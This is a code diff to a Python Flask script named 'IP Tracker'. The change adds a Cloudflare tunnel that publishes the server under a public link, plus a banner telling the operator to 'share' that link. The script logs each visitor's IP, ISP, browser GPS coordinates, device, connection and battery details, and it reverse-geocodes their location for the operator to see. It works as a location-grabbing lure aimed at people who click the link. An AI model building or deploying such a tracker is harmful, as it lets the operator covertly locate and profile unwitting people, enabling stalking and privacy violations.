@@ -1,6 +1,10 @@
 import json
 import os
 import requests
+import subprocess
+import threading
+import time
+import re
 from datetime import datetime, timezone
 from flask import Flask, request, render_template_string
 from user_agents import parse as parse_ua
@@ -30,6 +34,52 @@ try:
 except Exception as e:
     reader = None
     print(f"[bold red][!] MMDB load failed[/]: {e}")
+
+# ---- Cloudflare Tunnel ----
+def start_cloudflare_tunnel():
+    try:
+        subprocess.run(["cloudflared", "--version"], capture_output=True, check=True)
+    except:
+        console.print("[red]❌ cloudflared not found. Install: curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o cloudflared && chmod +x cloudflared && sudo mv cloudflared /usr/local/bin/[/]")
+        return None, None
+
+    try:
+        process = subprocess.Popen(
+            ["cloudflared", "tunnel", "--url", "http://localhost:80"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            bufsize=1
+        )
+        
+        public_url = None
+        for line in iter(process.stderr.readline, ''):
+            if "trycloudflare.com" in line:
+                match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
+                if match:
+                    public_url = match.group(0)
+                    console.print(f"[bold green]✅ Public URL:[/] [bold cyan]{public_url}[/]")
+                    break
+        return process, public_url
+    except Exception as e:
+        console.print(f"[red]❌ Tunnel failed: {e}[/]")
+        return None, None
+
+tunnel_process = None
+public_url = None
+
+def init_tunnel():
+    global tunnel_process, public_url
+    console.print("[yellow]🚀 Starting Cloudflare Tunnel...[/]")
+    tunnel_process, public_url = start_cloudflare_tunnel()
+    if public_url:
+        console.print(f"""
+[bold green]═══════════════════════════════════════════════════════
+   🌍 YOUR PUBLIC LINK: {public_url}
+═══════════════════════════════════════════════════════[/]
+        """)
+
+threading.Thread(target=init_tunnel, daemon=True).start()
 
 def geo_lookup(ip):
     """Return geo and ISP info from MMDB or ip-api."""
@@ -195,23 +245,16 @@ def log_data():
 
     has_precise_location = latitude is not None and longitude is not None
 
+    # Get IP info for ISP/ASN and fallback location
+    geo = geo_lookup(ip)
+
     if has_precise_location:
-        # Use the IP for network details and browser GPS for precise coordinates.
-        geo = geo_lookup(ip)
+        # OVERRIDE IP location with GPS coordinates
         geo.update({
             'latitude': latitude,
             'longitude': longitude,
             'postal': reverse_geocode_osm(latitude, longitude)
         })
-    else:
-        geo = geo_lookup(ip)
-
-    ua = parse_ua(info.get("ua", ""))
-    browser = f"{ua.browser.family} {ua.browser.version_string}"
-    os_     = f"{ua.os.family} {ua.os.version_string}"
-    device  = ua.device.family if ua.device.family and ua.device.family != "Other" else "Not reported by browser"
-
-    if has_precise_location:
         console.print(Panel(
             f"[bold green]Source:[/] Browser GPS (permission granted)\n"
             f"[bold green]Latitude:[/] {float(latitude):.6f}\n"
@@ -228,6 +271,11 @@ def log_data():
             title="[bold yellow]LOCATION STATUS[/]",
             border_style="yellow"
         ))
+
+    ua = parse_ua(info.get("ua", ""))
+    browser = f"{ua.browser.family} {ua.browser.version_string}"
+    os_     = f"{ua.os.family} {ua.os.version_string}"
+    device  = ua.device.family if ua.device.family and ua.device.family != "Other" else "Not reported by browser"
 
     def stylized_header(title, style="bold green"):
         return Text(f"\n── {title} ──", style=style)
@@ -268,7 +316,6 @@ def log_data():
         ("Memory (GB)", str(info.get("deviceMemory", "N/A"))),
         ("Conn Type", str((info.get("connection") or {}).get("effectiveType", "N/A"))),
         ("Conn RTT", str((info.get("connection") or {}).get("rtt", "N/A"))),
-
         ("Battery", json.dumps(info.get("battery", {}), separators=(", ", ": ")))
     ]:
         display_val = f"[bold green]{v}[/]" if v and v != "N/A" else "[red]N/A[/]"
@@ -302,5 +349,23 @@ def log_data():
     return ("", 204)
 
 if __name__ == "__main__":
-    print("[bold blue][*] Server listening on port 80[/]")
+    f = Figlet(font='slant')
+    console.print(f"[bold cyan]{f.renderText('IP Tracker')}[/]")
+    
+    console.print("[bold blue][*] Server listening on port 80[/]")
+    console.print("[yellow]⏳ Waiting for Cloudflare tunnel to establish...[/]")
+    time.sleep(3)
+    
+    if public_url:
+        console.print(f"""
+[bold green]╔══════════════════════════════════════════════════════════════════╗
+║  🌍 SHARE THIS PUBLIC LINK:                                        ║
+║  [bold cyan]{public_url}[/]  ║
+║  📊 Visit the link to see real-time data collection                 ║
+║  📁 Logs saved in: {LOG_DIR}/                                       ║
+╚══════════════════════════════════════════════════════════════════╝[/]
+        """)
+    else:
+        console.print("[red]⚠️  Cloudflare tunnel not available. Use localhost only.[/]")
+    
     app.run(host="0.0.0.0", port=80)
